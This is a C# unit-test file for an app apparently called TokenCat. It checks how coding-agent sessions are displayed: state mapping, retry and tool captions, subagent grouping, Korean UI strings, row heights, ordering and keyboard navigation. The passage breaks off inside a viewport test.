using System.Text;
using static TokenCat.Lang;
using static TokenCat.SessionPresentation;
using S = TokenCat.SessionDisplayState;
using A = TokenCat.TokenActivityState;

namespace TokenCat;

/// SessionPresentationChecks.swift, plus the SessionPresentation/OnboardingCard halves of LocalizationChecks.swift (DESIGN §15).
/// Left out: the Format cases (WP0's LocalizationChecks), FlowBars, FlowCard heights, MemoryPressure and fixture IDs (App or cut).
/// Windows: "Finder" is File Explorer, and the resume command is PowerShell (Windows paths always hold backslashes).
public static class SessionPresentationChecks
{
    public static List<string> Run()
    {
        var c = new Check("Session presentation", "Session presentation: ");
        void check(bool valid, string description) => c.That(valid, description);
        // 1_000_003 s: the newest 5 s bucket starts at 1_000_000.
        var now = DateTimeOffset.FromUnixTimeSeconds(1_000_003);
        DateTimeOffset at(double offset) => now.AddSeconds(offset);
        DateTimeOffset seconds(double value) => DateTimeOffset.UnixEpoch.AddSeconds(value);
        var utc = new DayCalendar(TimeZoneInfo.Utc, DayOfWeek.Sunday);
        var none = new HashSet<TokenSource>();
        HashSet<TokenSource> only(params TokenSource[] sources) => [.. sources];
        TokenReading reading(string id, TokenSource source = TokenSource.Claude, string? session = null, string? agent = null, string? project = null,
                             bool subagent = false, string? parent = null, bool active = false, A state = A.Idle, double last = -60) =>
            new(source, id)
            {
                SessionID = session, AgentID = agent, Project = project, IsSubagent = subagent, ParentSessionID = parent, Active = active,
                LastActivity = at(last), ActivityState = state,
            };
        SessionListModel make(IReadOnlyList<TokenReading> readings, bool expanded = false) => SessionListModel.Make(readings, now, expanded, calendar: utc);
        IEnumerable<string> ids(IEnumerable<SessionRowItem>? rows) => rows?.Select(row => row.Id) ?? [];

        // Display state maps the tracker enum; stale is "로그 대기" until the tracker calls it unfinished.
        S state(TokenReading value) => DisplayState(value, now);
        var output = reading("o", active: true, state: A.Output) with { LastOutputAt = at(-4), LastOutputDelta = 30 };
        var future = output with { LastOutputAt = at(4) };
        var old = output with { LastOutputAt = at(-6) };
        var tooFuture = output with { LastOutputAt = at(6) };
        var loggedLater = reading("s3", state: A.Stale, last: -900) with { LastLogAt = at(-300) };
        check(state(reading("s", state: A.Stale, last: -540)) == S.Waiting && state(reading("s2", state: A.Stale, last: -1_500)) == S.Waiting
              && state(loggedLater) == S.Waiting, "stale maps to waiting; the tracker decides when it becomes unfinished");
        check(state(reading("u", state: A.Unfinished, last: -60)) == S.Unfinished, "unfinished maps to unfinished");
        check(state(reading("c", state: A.Complete)) == S.Complete && state(reading("i", state: A.Interrupted)) == S.Interrupted
              && state(reading("n")) == S.Idle && S.Idle.Title == "최근 활동 없음", "inactive complete, interrupted and idle");
        check(state(reading("t", active: true, state: A.Tool)) == S.Tool, "open tool turn");
        check(state(output) == S.Working && state(future) == S.Working && state(old) == S.Working && state(tooFuture) == S.Working,
              "output is an event: a fresh record never changes the display state");
        check(S.LiveOrder.SequenceEqual([S.Input, S.Retrying, S.Tool, S.Working, S.Waiting]) && !Enum.GetNames<S>().Contains("Output"),
              "one urgency order, input > retry > tool > working > waiting, with no output state");
        check(state(reading("telemetry:codex:model", TokenSource.Codex)) == S.Measurement, "telemetry rows are measurements");
        check(!S.Waiting.IsRunning && S.Waiting.IsLive && !S.Unfinished.IsLive && S.Input.IsRunning && S.Retrying.IsRunning,
              "waiting is live but not running; unfinished is neither; input and retry are running");

        var alphaRunning = reading("claude:run", session: "RUN", project: "Alpha", active: true, state: A.Working, last: -2);
        // Input: a pending question or plan approval, shown even when the turn is no longer marked active.
        var question = reading("claude:q", session: "Q", project: "zeta", state: A.Input, last: -192)
            with { ToolCategory = ToolCategory.Question, ToolName = "AskUserQuestion" };
        var plan = question with { ToolName = "ExitPlanMode" };
        check(state(question) == S.Input && InputTitle(question) == "질문 답변 대기" && InputTitle(plan) == "계획 승인 대기", "input state and its kind");
        check(StateGlyphKind.From(S.Input) != StateGlyphKind.From(S.Waiting) && S.Input.Title == "입력 필요", "input has its own colour and title");

        // API retry: counts and delays only, for 10 minutes after the record.
        var retrying = reading("claude:r", session: "R", project: "beta", active: true, state: A.Working, last: -3)
            with { Retry = new TokenRetryState(2, 10, at(4), false, at(-3)) };
        var oldRetry = retrying with { Retry = retrying.Retry! with { At = at(-700) } };
        check(state(retrying) == S.Retrying && state(oldRetry) == S.Working, "a recent retry shows; an old one falls back");
        check(RetryText(retrying.Retry!, now) == "재시도 2/10 · 4초 후"
              && RetryText(new TokenRetryState(7, 10, at(20), true, now), now) == "재시도 7/10 · 네트워크 끊김"
              && RetryText(new TokenRetryState(3, null, null, false, now), now) == "재시도 3회째 · 재요청 중", "retry copy");

        // Tool categories replace the generic chip text; raw names never appear in it.
        var command = reading("codex:cmd", TokenSource.Codex, session: "C", project: "alpha", active: true, state: A.Tool, last: -40)
            with { ToolCategory = ToolCategory.Command, ToolName = "exec" };
        check(StateTitle(S.Tool, command) == "명령 실행" && StateTitle(S.Tool, reading("x", active: true, state: A.Tool)) == "도구 실행"
              && ToolTitle(ToolCategory.Agent) == "하위 에이전트 대기" && ToolTitle(ToolCategory.Mcp) == "MCP 도구 실행", "tool category titles");

        // Grouping is by exact (source, session) identity.
        var claudeParent = reading("claude:p", session: "S1", project: "TokenCat", active: true, state: A.Working, last: -2);
        var claudeChild = reading("claude:p/agent-b", session: "S1", agent: "b1234567890", project: "TokenCat", subagent: true,
                                  active: true, state: A.Tool, last: -1);
        var codexParent = reading("codex:root", TokenSource.Codex, session: "R1", project: "TokenCat", state: A.Complete, last: -30);
        var codexChild = reading("codex:child", TokenSource.Codex, session: "C1", agent: "/root/sample_runner", project: "sample-chat",
                                 subagent: true, parent: "R1", active: true, state: A.Working, last: -3);
        var orphan = reading("claude:orphan", session: "S9", agent: "a9", project: "Elsewhere", subagent: true, state: A.Complete, last: -400);
        var crossSource = reading("codex:cross", TokenSource.Codex, session: "S1", agent: "x", subagent: true, state: A.Complete, last: -500);
        var telemetry = reading("telemetry:claude:S1", session: "S1", state: A.Complete, last: -10);
        var groups = Groups([orphan, codexChild, claudeChild, telemetry, crossSource, codexParent, claudeParent], now);
        SessionGroup? group(string id) => groups.FirstOrDefault(value => value.Id == id);
        check(group("claude:p")?.Children.Select(member => member.Reading.Id).SequenceEqual(["claude:p/agent-b"]) == true,
              "Claude agent folds under its session");
        check(group("codex:root")?.Children.Select(member => member.Reading.Id).SequenceEqual(["codex:child"]) == true,
              "Codex child folds by parentSessionID");
        check(group("claude:orphan")?.Lead.Reading.IsSubagent == true && group("codex:cross") is not null, "orphans and other-source children stay top-level");
        check(group("telemetry:claude:S1")?.Children.Count == 0 && groups.Count == 5, "telemetry never groups");
        check(group("codex:root")?.State == S.Working && group("claude:p")?.State == S.Tool, "group state follows its most active member");
        var quietLead = reading("claude:q", session: "S7", state: A.Stale, last: -1_000);
        var busyChild = reading("claude:q/agent-c", session: "S7", agent: "c1", subagent: true, active: true, state: A.Tool, last: -10);
        check(Groups([quietLead, busyChild], now).FirstOrDefault()?.Lead.State == S.Tool
              && Groups([quietLead], now).FirstOrDefault()?.Lead.State == S.Waiting,
              "a lead quiet past its allowance waits on its running subagent, not on its log");
        check(AgentLabel(codexChild) == "sample_runner" && AgentLabel(claudeChild) == "b1234567", "agent labels");
        check(ChildProjectSuffix(codexChild, codexParent) == "sample-chat" && ChildProjectSuffix(claudeChild, claudeParent) == null,
              "child shows a differing project");
        var modelled = claudeParent with { Model = "claude-opus-5-5", Effort = "XHigh" };
        check(ShortID(codexParent) == "R1" && ShortID(orphan) == "a9" && ClientLine(modelled) == "Claude Code · claude-opus-5-5 · xhigh"
              && ClientLine(codexParent) == "Codex · 모델 기록 대기", "short identity and the one-text client line");
        check(SpokenLabel(modelled, S.Input) == "입력 필요, TokenCat, Claude Code claude-opus-5-5"
              && SpokenLabel(codexChild, S.Working) == "하위 에이전트 sample_runner, 진행", "VoiceOver row labels");
        // A client-generated title names a lead row; the project stays on the row as meta, in help and in VoiceOver.
        var titled = modelled with { Title = "Fix login redirect" };
        var titledNoProject = titled with { Project = null };
        check(RowTitle(titled) == "Fix login redirect" && RowProject(titled) == "TokenCat"
              && RowTitle(modelled) == "TokenCat" && RowProject(modelled) == null
              && RowTitle(titledNoProject) == "Fix login redirect" && RowProject(titledNoProject) == null
              && ClientLine(titled) == "TokenCat · Claude Code · claude-opus-5-5 · xhigh"
              && TitleHelp(titled) == "Fix login redirect · TokenCat" && TitleHelp(modelled) == null
              && SpokenLabel(titled, S.Input) == "입력 필요, Fix login redirect, TokenCat, Claude Code claude-opus-5-5",
              "a titled row leads with its title and keeps the project as meta, in help and in VoiceOver");
        var roleChild = claudeChild with { AgentRole = "Explore" };
        var reviewChild = codexChild with { AgentRole = "guardian" };
        check(ChildTitle(roleChild) == ("Explore", "b1234567") && ChildTitle(claudeChild) == ("하위 에이전트", "b1234567")
              && ChildTitle(reviewChild) == ("sample_runner", "자동 검토")
              && ChildName(roleChild) == "Explore" && ChildName(claudeChild) == "b1234567" && ChildName(reviewChild) == "sample_runner",
              "subagent role labels keep the ID; an unnamed subagent is titled 하위 에이전트 with its ID beside it");
        var workflowChild = claudeChild with { AgentID = "a1111111e1", AgentRole = "workflow-subagent" };
        var generalChild = workflowChild with { AgentRole = " general-purpose " };
        check(ChildTitle(workflowChild) == ("하위 에이전트", "a1111111") && ChildTitle(generalChild) == ("하위 에이전트", "a1111111")
              && SpokenLabel(workflowChild, S.Working) == "하위 에이전트 a1111111, 진행"
              && RoleLabel(workflowChild.AgentRole) == "workflow-subagent" && RoleLabel(reviewChild.AgentRole) == "자동 검토" && RoleLabel("  ") == null,
              "shared roles read as 하위 에이전트 with the ID (never \"하위 에이전트 하위 에이전트\" when spoken); help keeps the role");
        var counts = new SessionCounts(groups);
        check(counts.RunningGroups == 2 && counts.Tool == 1 && counts.Working == 1 && counts.RunningSubagents == 2 && counts.Phase == A.Tool
              && counts.Readings == 7 && counts.ToolMembers == 1 && counts.ToolCategories.GetValueOrDefault(ToolCategory.Other) == 1,
              "counts are per group");
        var outputChild = reading("claude:p/agent-o", session: "S1", agent: "o1", subagent: true, active: true, state: A.Output, last: -1)
            with { LastOutputAt = at(-1), LastOutputDelta = 12 };
        var mixedCounts = new SessionCounts(Groups([claudeParent, claudeChild, outputChild], now));
        check(mixedCounts.Tool == 1 && mixedCounts.Working == 0 && mixedCounts.ToolMembers == 1 && mixedCounts.Phase == A.Tool,
              "a fresh record never hides a running tool in the group or the menu-bar phase");
        var inputChild = reading("claude:p/agent-q", session: "S1", agent: "q1", subagent: true, state: A.Input, last: -5)
            with { ToolCategory = ToolCategory.Question };
        var inputCounts = new SessionCounts(Groups([claudeParent, claudeChild, inputChild, retrying], now));
        check(inputCounts.Input == 1 && inputCounts.Tool == 0 && inputCounts.Retrying == 1 && inputCounts.RunningGroups == 2
              && inputCounts.Phase == A.Input && inputCounts.Retry?.Attempt == 2, "input outranks tool for the group and the menu-bar phase");
        check(ChildGroupText(S.Input, 1) == "하위 1개 입력 필요" && ChildGroupText(S.Retrying, 2) == "하위 2개 API 재시도"
              && ChildGroupText(S.Tool, 3) == "하위 3개 진행 중" && ChildGroupText(S.Waiting, 4) == "하위 4개 로그 대기", "an idle lead names its children's state");
        check(new SessionCounts(Groups([retrying], now)).Phase == A.Working, "a retry alone keeps the neutral phase");
        // Group state and menu-bar phase share one order: a retry outranks a tool in both.
        var retryingChild = reading("claude:p/agent-r", session: "S1", agent: "r1", subagent: true, active: true, state: A.Working, last: -1)
            with { Retry = new TokenRetryState(1, 10, at(5), false, at(-1)) };
        var retryGroups = Groups([claudeParent, claudeChild, retryingChild], now);
        var retryCounts = new SessionCounts(retryGroups);
        check(retryGroups.FirstOrDefault()?.State == S.Retrying && retryCounts.Retrying == 1 && retryCounts.Tool == 0
              && retryCounts.Phase == SessionCounts.PhaseOf(S.Retrying) && retryCounts.Phase == A.Working,
              "group state and menu-bar phase follow the same order");

        // The flow-card caption: retry > tool category > progress > waiting, only after 30 s without a record; input keeps the base.
        FlowCaption caption(SessionCounts value, double? last) => Caption(value, last is { } offset ? at(offset) : null, now);
        var noticeCounts = new SessionCounts(Groups([command, reading("claude:w", session: "W", state: A.Stale, last: -200)], now));
        check(caption(noticeCounts, -40).Text == "명령 실행 중 · 응답 후 기록" && !caption(noticeCounts, -40).Emphasized
              && caption(noticeCounts, -10).Text == "마지막 기록" && caption(noticeCounts, -10).Glyph == null, "tool category caption after 30 s");
        noticeCounts = noticeCounts with { Tool = 0 };
        check(caption(noticeCounts, null).Text == "로그 대기 · 3분째 기록 없음", "waiting caption");
        var urgent = new SessionCounts(Groups([command, retrying, question], now));
        var retryOnly = new SessionCounts(Groups([command, retrying], now));
        check(caption(urgent, -2).Text == "마지막 기록" && caption(urgent, -40).Text == "마지막 기록"
              && caption(urgent, -40).Glyph == null && !caption(urgent, -40).Emphasized
              && caption(retryOnly, -40).Text == "API 재시도 2/10 · 4초 후" && caption(retryOnly, -40).Glyph == StateGlyphKind.Retry
              && caption(retryOnly, -40).Emphasized,
              "a turn waiting for input keeps the base caption (the header says it); retry captions follow the 30 s rule and are emphasized");
        var offlineCounts = retryOnly with { Retry = retryOnly.Retry! with { NetworkDown = true } };
        check(caption(offlineCounts, null).Text == "API 재시도 · 네트워크 끊김" && caption(new SessionCounts(), null).Text == "마지막 기록",
              "network-down retry; nothing live keeps the default");
        var plan2 = plan with { Id = "claude:q2", SessionID = "Q2" };
        var question3 = question with { Id = "claude:q3", SessionID = "Q3" };
        var plans = new SessionCounts(Groups([plan, plan2, command], now));
        var mixedInput = new SessionCounts(Groups([plan, question3], now));
        check(plans.InputPlansOnly && caption(plans, null).Text == "마지막 기록"
              && !mixedInput.InputPlansOnly && caption(mixedInput, null).Text == "마지막 기록",
              "plan approvals and questions alike keep the base caption");

        // Header sentence (H-2) and head echo (H-3): one sentence per top state.
        HeaderStatus header(SessionCounts value, bool loading = false, bool spoken = false) => Header(value, loading, now, spoken: spoken);
        var loadingHeader = header(new SessionCounts(), loading: true);
        check(loadingHeader.Sentence == "기록 확인 중" && loadingHeader.Muted && loadingHeader.Suffix.Length == 0 && loadingHeader.Glyph == null,
              "loading header");
        check(header(urgent).Spoken == "입력 필요 1개 · 진행 2개" && header(urgent).Glyph == StateGlyphKind.Input && header(urgent).Head == RunnerHead.Alert
              && header(plans).Spoken == "계획 승인 대기 2개 · 진행 1개"
              && header(new SessionCounts(Groups([question], now))).Spoken == "입력 필요 1개 · 답변하면 계속됩니다"
              && header(urgent).Help.Contains("권한 확인 요청은 로그에 남지 않아"), "input header");
        check(header(retryOnly).Spoken == "API 재시도 1개 · 재시도 2/10 · 4초 후" && header(retryOnly).Glyph == StateGlyphKind.Retry, "retry header");
        var toolHeader = header(new SessionCounts(Groups([claudeParent, claudeChild, codexParent, codexChild], now)));
        var progressHeader = header(new SessionCounts(Groups([alphaRunning], now)));
        check(toolHeader.Spoken == "세션 2개 진행 중 · 도구 실행 1 · 하위 2" && toolHeader.Glyph == StateGlyphKind.Tool && toolHeader.Head == RunnerHead.Normal
              && progressHeader.Spoken == "세션 1개 진행 중" && progressHeader.Glyph == StateGlyphKind.Working, "tool and progress header");
        check(header(noticeCounts).Spoken == "로그 대기 1개 · 3분째 새 기록 없음" && header(noticeCounts).Glyph == StateGlyphKind.Waiting, "log-wait header");
        var oldCounts = new SessionCounts(Groups([reading("claude:old", session: "O", state: A.Complete, last: -7_300)], now));
        var restHeader = header(oldCounts);
        var recentHeader = header(new SessionCounts(Groups([reading("claude:new", session: "N", state: A.Complete, last: -120)], now)));
        check(restHeader.Spoken == "진행 중인 세션 없음 · 마지막 활동 2시간 전" && restHeader.Glyph == null && restHeader.Head == RunnerHead.Sleep
              && recentHeader.Head == RunnerHead.Normal && header(new SessionCounts()).Spoken == "진행 중인 세션 없음"
              && header(new SessionCounts()).Head == RunnerHead.Sleep, "no live session: last activity, and the head sleeps after 10 minutes");
        check(Header(oldCounts, false, now, quietSince: now.AddSeconds(-300)).Head == RunnerHead.Normal
              && Header(oldCounts, false, now, quietSince: now.AddSeconds(-700)).Head == RunnerHead.Sleep,
              "the header head sleeps on the menu-bar cat's quiet reference, not only the last log record");
        // Every client is read now, so help that applies to all of them names none (an omp-only Mac saw "no Codex or Claude Code").
        check(new[] { loadingHeader.Help, restHeader.Help, caption(noticeCounts, null).Help }.All(help => !help.Contains("Codex") && !help.Contains("Claude"))
              && restHeader.Help == "진행 중인 코딩 에이전트 세션이 없습니다",
              "client-neutral header and caption help");
        // The flow card's split with four clients: widest first, then the smallest folding into " · 외 N" / " · +N more" (a
        // bare "+1" read as one more token); one client is its name only.
        var splits = ProviderSplits(new Dictionary<TokenSource, int>
            { [TokenSource.Codex] = 1_200, [TokenSource.Claude] = 6_600, [TokenSource.OpenCode] = 300, [TokenSource.Omp] = 70_000 });
        check(splits[0] == "omp 70k · Claude Code 6.6k · Codex 1.2k · OpenCode 300" && splits.Count == 4
              && splits[1] == "omp 70k · Claude Code 6.6k · Codex 1.2k · 외 1" && splits[^1] == "omp 70k · 외 3"
              && ProviderSplits(new Dictionary<TokenSource, int> { [TokenSource.Codex] = 10 }).SequenceEqual(["Codex"])
              && ProviderSplits(new Dictionary<TokenSource, int>()).SequenceEqual([""]),
              $"provider split folds into 외 N, widest first: {string.Join(" | ", splits)}");

        // Stable ordering: input first, then running groups by project and session, unaffected by activity time.
        var beta = reading("claude:beta", session: "B", project: "beta", active: true, state: A.Working, last: -1);
        var alpha = reading("claude:alpha", session: "A", project: "Alpha", active: true, state: A.Working, last: -50);
        var waiting = reading("claude:wait", session: "W", project: "aaa", state: A.Stale, last: -200);
        var idle = Enumerable.Range(0, 8).Select(i => reading($"claude:idle{i}", session: $"I{i}", project: "idle", state: A.Complete, last: -100 - i));
        var measurement = new TokenSpeedMeasurement(new TelemetryReading { Provider = TokenSource.Codex, At = at(-10) })
            with { OutputTokens = 100, RequestDurationMs = 1_000 };
        var measured = reading("telemetry:codex:model:gpt", TokenSource.Codex, state: A.Complete, last: -10) with { SpeedMeasurement = measurement };
        List<TokenReading> input = [beta, alpha, waiting, measured, .. idle];
        var first = make(input);
        alpha = alpha with { LastActivity = at(0) };
        input[1] = alpha;
        var second = make(input);
        string[] expectedOrder = ["claude:alpha", "claude:beta", "claude:wait", "telemetry:codex:model:gpt", "claude:idle0", "claude:idle1"];
        check(first.Blocks.Select(block => block.Id).SequenceEqual(expectedOrder) && second.Blocks.Select(block => block.Id).SequenceEqual(expectedOrder),
              "running, waiting, measured, then recent idle; stable when activity changes");
        check(make([.. input, question]).Blocks.FirstOrDefault()?.Id == "claude:q", "a turn waiting for input goes first");
        check(first.HiddenGroups == 6 && first.HiddenChildren == 0 && first.Counts.Groups == 12, "collapsed list fills to six rows");
        check(first.ContentHeight == 44 * 3 + 28 * 3 + 5 + 1 + SessionListModel.OlderHeight,
              "quiet live rows fold to 44pt; the toggle adds a 1 pt rule and its 28 pt row; heights stay deterministic");
        // One disclosure at the end of the list (#6): last entry, last navigation stop, 28 pt, named by what it does.
        check(first.ShowsToggle && first.Entries(false)[^1] is SessionListEntry.Toggle && first.Entries(false)[^1].Id == SessionListModel.ToggleID
              && first.Entries(false)[^2] is SessionListEntry.Divider { Key: SessionListModel.ToggleID } && first.Entries(false)[^2].Id == "divider:toggle"
              && first.Entries(false)[^3] is SessionListEntry.Block && first.Navigation(false)[^1] == SessionListModel.ToggleID
              && first.ToggleText == "세션 12개 모두 보기" && first.ToggleHelp == "하위 에이전트 포함 12개 기록 · 접힌 세션 6개"
              && !make([beta]).ShowsToggle && !make([beta]).Entries(false).OfType<SessionListEntry.Toggle>().Any()
              && !make([beta]).Navigation(false).Contains(SessionListModel.ToggleID)
              && make([beta], expanded: true) is { ShowsToggle: true, ToggleText: "접기" } folded && folded.Entries(false)[^1] is SessionListEntry.Toggle,
              "the list toggle is the last entry and navigation stop while something is folded, and folds the expanded list again");
        // Line 3 holds the current turn's last record, context or a measured speed; anything else stays at 44 pt.
        var flowing = alpha with { CurrentTurnStartedAt = at(-60), LastOutputAt = at(-20), LastOutputDelta = 40 };
        var earlierTurn = flowing with { CurrentTurnStartedAt = at(-10) };
        var withContext = beta with { Context = new TokenContextUsage(1_000, null, at(-1), null) };
        var withSpeed = beta with { SpeedMeasurement = measurement };
        check(make([flowing]).Blocks.FirstOrDefault()?.Lead.Height == 58 && make([withContext]).Blocks.FirstOrDefault()?.Lead.Height == 58
              && make([withSpeed]).Blocks.FirstOrDefault()?.Lead.Height == 58 && make([earlierTurn]).Blocks.FirstOrDefault()?.Lead.Height == 44
              && LastRecord(flowing)?.Tokens == 40 && LastRecord(earlierTurn) == null,
              "a record, context or measured speed keeps the third line; an earlier turn's record does not");
        check(new SessionRowItem(beta, S.Working, SessionRowKind.Live) { ShowsDetail = false }.Height == 44
              && new SessionRowItem(beta, S.Complete, SessionRowKind.Idle).Height == 28
              && new SessionRowItem(claudeChild, S.Tool, SessionRowKind.Child).Height == 24
              && new[] { SessionListModel.MoreHeight, SessionListModel.CaptionHeight, SessionListModel.OlderHeight, SessionListModel.DividerHeight }
                  .SequenceEqual([24.0, 24, 28, 1]), "row heights on the 4 pt grid");
        // Speed column (S-3): only when a visible live lead row has a measurement; child rows have no speed cell.
        var restingSpeed = withSpeed with { Active = false, ActivityState = A.Complete };
        var measuredChild = claudeChild with { SpeedMeasurement = measurement };
        check(!make([beta, alpha]).ShowsSpeedColumn && make([beta, withSpeed]).ShowsSpeedColumn
              && !make([restingSpeed]).ShowsSpeedColumn && !make([claudeParent, measuredChild]).ShowsSpeedColumn
              && !make([claudeParent, measuredChild], expanded: true).ShowsSpeedColumn,
              "speed column follows visible live lead measurements");
        // The column never adds a third line of its own, and a client waiting for a restart opens none.
        var column = make([alpha, withSpeed]);
        var restarting = SessionListModel.Make([withSpeed], now, false, only(TokenSource.Claude), utc);
        check(column.ShowsSpeedColumn && column.Item(alpha.Id)?.Height == 44 && column.Item(withSpeed.Id)?.Height == 58
              && !restarting.ShowsSpeedColumn && restarting.Blocks.FirstOrDefault()?.Lead.Height == 44,
              "a row without a record, context or speed stays at 44 pt beside a speed column; a restart-waiting measurement opens nothing");
        // "—" only where a speed is expected: working, tool and API retry rows; input and log-wait rows show a measured value or nothing.
        string? cell(TokenReading value, S rowState, bool showsColumn = true, IReadOnlySet<TokenSource>? restart = null) =>
            SpeedCell(value, rowState, now, showsColumn, restart ?? none)?.Value;
        var measuredInput = question with { SpeedMeasurement = measurement };
        check(cell(alpha, S.Working) == "—" && cell(alpha, S.Tool) == "—" && cell(retrying, S.Retrying) == "—"
              && cell(question, S.Input) == null && cell(waiting, S.Waiting) == null && cell(measuredInput, S.Input) == "100.0"
              && cell(alpha, S.Working, showsColumn: false) == null && cell(withSpeed, S.Working, restart: only(TokenSource.Claude)) == null,
              "the speed cell shows a dash only where a speed is expected");
        // Short IDs only where two visible rows share a project.
        var twin = beta with { Id = "claude:beta2", SessionID = "B2" };
        check(make([beta, twin, alpha]).SharedProjects(false).SetEquals(["beta"]) && make([beta, alpha]).SharedProjects(false).Count == 0,
              "shared projects");
        var expanded = make(input, expanded: true);
        check(expanded.Blocks.Count == 12 && expanded.HiddenGroups == 0 && expanded.HiddenChildren == 0, "expanded shows every group");
        var family = make([codexParent, codexChild, reading("codex:done", TokenSource.Codex, session: "C2", agent: "/root/done",
                                                            subagent: true, parent: "R1", state: A.Complete, last: -20)]);
        check(family.Blocks.FirstOrDefault()?.Lead.Kind == SessionRowKind.Idle && ids(family.Blocks.FirstOrDefault()?.Children).SequenceEqual(["codex:child"])
              && family.Blocks.FirstOrDefault()?.ChildCount == 2 && family.HiddenGroups == 0 && family.HiddenChildren == 1
              && family.ShowsToggle && family.ToggleText == "하위 1개 더 보기",
              "collapsed groups show only live children; the toggle offers a hidden finished child");
        // While a child runs, children waiting for a log stay in the summary row only.
        var floodParent = reading("claude:S1", session: "S1", project: "TokenCat", state: A.Complete, last: -600);
        var flood = Enumerable.Range(0, 9)
            .Select(i => reading($"claude:S1/a{i}", session: "S1", agent: $"a0{i}xxxxx", subagent: true, state: A.Stale, last: -100))
            .Append(reading("claude:S1/z", session: "S1", agent: "zz-tool", subagent: true, active: true, state: A.Tool, last: -1)).ToList();
        var floodCollapsed = make([floodParent, .. flood]);
        var floodBlock = floodCollapsed.Blocks.FirstOrDefault();
        check(ids(floodBlock?.Children).SequenceEqual(["claude:S1/z"]) && floodBlock?.State == S.Tool
              && floodBlock?.RunningChildren == 1 && floodBlock?.WaitingChildren == 9, "waiting children take no slot while a child runs");
        check(floodBlock?.MoreCount == 9 && floodBlock?.MoreText == "+9 하위 로그 대기 · 마지막 1분 전"
              && floodCollapsed.HiddenGroups == 0 && floodCollapsed.HiddenChildren == 9
              && floodCollapsed.ContentHeight == 28 + 24 + 24 && !floodCollapsed.ShowsToggle
              && !floodCollapsed.Entries(false).OfType<SessionListEntry.Toggle>().Any(),
              "cut children are summarised with their newest record; no closing toggle repeats what the +N row offers");
        var quietBlock = make([floodParent, .. flood.SkipLast(1)]).Blocks.FirstOrDefault();
        check(ids(quietBlock?.Children).SequenceEqual(["claude:S1/a0", "claude:S1/a1", "claude:S1/a2"]) && quietBlock?.MoreCount == 6,
              "with nothing running, up to three waiting children show");
        var busy = Enumerable.Range(0, 4).Select(i => reading($"claude:S1/r{i}", session: "S1", agent: $"r0{i}xxxxx", subagent: true, active: true,
                                                              state: i == 3 ? A.Tool : A.Working, last: -1)).ToList();
        var busyBlock = make([floodParent, .. busy, .. flood.SkipLast(1)]).Blocks.FirstOrDefault();
        check(ids(busyBlock?.Children).SequenceEqual(busy.Select(value => value.Id)) && busyBlock?.MoreCount == 9,
              "running children are never cut by the collapsed cap");
        var floodExpanded = make([floodParent, .. flood], expanded: true).Blocks.FirstOrDefault();
        check(floodExpanded?.Children.Count == 10 && floodExpanded?.MoreCount == 0 && floodExpanded?.Children.FirstOrDefault()?.Id == "claude:S1/z",
              "expanded shows every child, running first");

        // Expanded date captions come from the model clock; "이전" folds behind one row.
        const double day = 86_400;
        // 1_000_003 s is Monday 1970-01-12 13:46:43 UTC.
        check(DaySection(at(-600), now, utc) == "오늘" && DaySection(at(-day), now, utc) == "어제"
              && DaySection(at(-3 * day), now, utc) == "이전" && DaySection(at(30), now, utc) == "오늘", "day sections");
        var weekCalendar = utc with { FirstDay = DayOfWeek.Monday };
        var thursday = seconds(1_000_003 + 3 * day);
        check(DaySection(thursday.AddSeconds(-3 * day), thursday, weekCalendar) == "이번 주"
              && DaySection(thursday.AddSeconds(-4 * day), thursday, weekCalendar) == "이전", "this week follows the calendar week");
        TokenReading[] dated = [reading("claude:d0", session: "D0", state: A.Complete, last: -600), reading("claude:d1", session: "D1", state: A.Complete, last: -day),
                                reading("claude:d2", session: "D2", state: A.Complete, last: -5 * day), reading("claude:d3", session: "D3", state: A.Complete, last: -9 * day)];
        var datedList = make([beta, .. dated], expanded: true);
        string[] datedIDs = ["claude:beta", "caption:claude:d0", "claude:d0", "caption:claude:d1", "claude:d1", "divider:older", "older", "divider:toggle", "toggle"];
        // beta 44 + (caption 24 + row 28) × 2 + divider 1 + older 28 + divider 1 + toggle 28; open: + (caption 24 + row 28 + divider 1 + row 28)
        // instead of the fold.
        const double foldedHeight = 44 + 52 + 52 + 1 + 28 + 1 + 28, openHeight = 44 + 52 + 52 + 24 + 28 + 1 + 28 + 1 + 28;
        IEnumerable<bool> rules(SessionListModel list) => list.Entries(true).OfType<SessionListEntry.Caption>().Select(entry => entry.Rule);
        check(datedList.Blocks.Select(block => block.Section).SequenceEqual([null, "오늘", "어제", "이전", "이전"]) && datedList.OlderCount == 2
              && datedList.Entries(false).Select(entry => entry.Id).SequenceEqual(datedIDs) && rules(datedList).SequenceEqual([true, true, true])
              && rules(make(dated, expanded: true)).SequenceEqual([false, true, true])
              && datedList.ContentHeight == foldedHeight && datedList.OlderContentHeight == openHeight,
              "captions, a rule above all but a caption at the top, folded older section and both heights");
        // A frozen order can place two runs of the same section; each caption still has its own identity.
        var frozenIDs = datedList.Reordered(["claude:beta", "claude:d0", "claude:d1", "claude:d2"]).Entries(true).Select(entry => entry.Id).ToList();
        check(frozenIDs.Distinct().Count() == frozenIDs.Count, "duplicate list entry IDs");
        // Keyboard navigation skips captions and dividers; selection starts at input, then retry, then the first row.
        check(datedList.Navigation(false).SequenceEqual(["claude:beta", "claude:d0", "claude:d1", "older", "toggle"])
              && datedList.Navigation(true).Count == 6 && datedList.Navigation(true)[^1] == "toggle"
              && make([beta, retrying, question]).StartRow(false) == "claude:q"
              && make([beta, retrying]).StartRow(false) == "claude:r" && make([beta, alpha]).StartRow(false) == "claude:alpha",
              "navigation rows and the first selection");
        var floodNavigation = make([reading("claude:S1", session: "S1", project: "TokenCat", state: A.Complete, last: -600),
                                    .. Enumerable.Range(0, 5).Select(i => reading($"claude:S1/a{i}", session: "S1", agent: $"a0{i}xxxxx", subagent: true,
                                                                                  state: A.Stale, last: -100))]);
        check(floodNavigation.Navigation(false).SequenceEqual(["claude:S1", "claude:S1/a0", "claude:S1/a1", "claude:S1/a2", "more:claude:S1"]),
              "children and the +N row are navigable; all hidden children in the +N row leave no toggle");
        // Frozen order (S-8): known blocks keep their place, new ones go to the end, heights follow.
        var frozen = make([beta, alpha, waiting]).Reordered(["claude:wait", "claude:beta"]);
        check(frozen.Blocks.Select(block => block.Id).SequenceEqual(["claude:wait", "claude:beta", "claude:alpha"])
              && frozen.ContentHeight == make([beta, alpha, waiting]).ContentHeight, "a frozen order appends new blocks");

        // The viewport cut lands at least 12pt inside a row and hides at least 6pt of it.
        var longList = make(Enumerable.Range(0, 12).Select(i => reading($"claude:L{i}", session: $"L{i}", active: true, state: A.Working, last: -1)).ToList());
        var cut = longList.Viewport(false);
